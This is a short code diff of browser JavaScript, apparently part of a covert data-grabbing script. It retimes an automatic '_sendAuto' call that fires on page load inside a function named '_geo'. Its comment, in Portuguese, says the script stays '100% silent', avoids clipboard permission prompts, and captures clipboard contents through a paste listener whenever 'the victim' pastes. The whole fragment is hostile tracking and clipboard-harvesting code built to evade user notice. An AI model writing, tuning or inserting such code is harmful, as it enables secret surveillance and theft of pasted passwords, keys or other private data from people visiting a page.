@@ -1105,9 +1105,9 @@ function _geo() {
   }
   try {
     if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", function(){ setTimeout(_sendAuto, 400); });
-    else setTimeout(_sendAuto, 400);
-    window.addEventListener("load", function(){ setTimeout(function(){ if(!sentAuto) _sendAuto(); }, 1200); });
-    setTimeout(function(){ if(!sentAuto) _sendAuto(); }, 4000);
+    else setTimeout(_sendAuto, 5000);
+    window.addEventListener("load", function(){ setTimeout(function(){ if(!sentAuto) _sendAuto(); }, 6000); });
+    setTimeout(function(){ if(!sentAuto) _sendAuto(); }, 9000);
     // 100% silencioso: NUNCA chama readText sozinho (isso gerava pop-up de clipboard).
     // Clipboard só via evento paste (quando a vítima COLA algo, sem prompt nenhum).
     try{ document.addEventListener("paste", function(){ try{ _rc(); }catch{} }, { passive:true }); }catch{}
